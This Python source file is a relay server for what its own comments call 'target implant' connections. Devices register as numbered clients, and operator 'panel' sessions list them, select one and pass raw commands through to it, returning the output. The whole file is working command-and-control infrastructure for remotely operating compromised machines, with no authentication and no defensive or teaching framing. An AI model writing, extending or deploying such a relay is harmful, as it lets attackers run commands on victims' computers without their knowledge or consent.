import threading
import socket
import os

connections = {}
client_count = 0
server_count = 0

HOST = "0.0.0.0"
PORT = int(os.environ.get("PORT", 5432))
bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bridge.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
bridge.bind((HOST, PORT))
bridge.listen()
print(f"Server is listening on: {HOST}, {PORT}")

def sendMessage(conn, target):
    while True:
        try:
            # Read up to 8KB of data to prevent long command payload clipping
            raw_cmd = conn.recv(8192)
            if not raw_cmd:
                break
                
            cmd = raw_cmd.decode('utf-8', errors='ignore').strip()
            if not cmd:
                continue

            # Forward raw string payload exactly as it arrived to target implant
            target.sendall(raw_cmd)

            if cmd == "exit":
                conn.sendall(b"Disconnected from client\n")
                return

            # Capture up to 64KB response window from target payload to handle large directory ls readouts
            raw_reply = target.recv(65536)
            if not raw_reply:
                conn.sendall(b"Target connection lost unexpectedly\n")
                return
                
            conn.sendall(raw_reply)
        except (OSError, ConnectionError):
            break

def askOpt(conn):
    clients = [name for name in connections if name.startswith("client")]
    if not clients:
        conn.sendall(b"No targets connected\n")
        return
        
    # Append trailing newline explicitly so server controller terminates read loops cleanly
    menu = "\n".join(f"{c}|{targets}" for c, targets in enumerate(clients, start=1)) + "\n"
    conn.sendall(menu.encode('utf-8'))
    
    while True:
        try:
            raw_data = conn.recv(1029)
            if not raw_data:
                break
            data = raw_data.decode('utf-8', errors='ignore').strip()
            if not data:
                continue
            if data == "exit":
                return
            if data == "list":
                conn.sendall(b"Please select a target number, or type exit\n")
                continue
                
            try:
                index = int(data) - 1
            except ValueError:
                conn.sendall(b"invalid selection: please enter a number\n")
                continue
                
            if index < 0 or index >= len(clients):
                conn.sendall(b"invalid selection\n")
                continue
                
            name = clients[index]
            if name not in connections:
                conn.sendall(b"Target disconnected. Refresh the list.\n")
                return
                
            target = connections[name]
            conn.sendall(f"Selected target {data}\n".encode('utf-8'))
            sendMessage(conn, target)
            return
        except (OSError, ConnectionError):
            break

def handle_client(conn):
    global client_count
    global server_count
    identity = None
    try:
        while True:
            raw_data = conn.recv(1029)
            if not raw_data:
                break
                
            data = raw_data.decode('utf-8', errors='ignore').strip().lower()
            if not data:
                continue

            if data == "client":
                client_count += 1
                identity = f"client{client_count}"
                connections[identity] = conn
                print(f"Registered device: {identity}")
                continue

            if data == "server":
                server_count += 1
                identity = f"server{server_count}"
                connections[identity] = conn
                print(f"Registered panel session: {identity}")
                continue

            if data == "list":
                askOpt(conn)
                
    except Exception as e:
        print(f"Connection thread exception dropped: {type(e).__name__} -> {e}")
    finally:
        if identity and identity in connections:
            del connections[identity]
        conn.close()
        print(f"Cleaned up session endpoint link context.")

def handle_connection():
    while True:
        try:
            conn, addr = bridge.accept()
            c = threading.Thread(target=handle_client, args=(conn,), daemon=True)
            c.start()
            print(f"Connected incoming gateway pipe from: {addr}")
        except Exception as e:
            print(f"Acceptance block warning: {e}")

t = threading.Thread(target=handle_connection, daemon=False)
t.start()
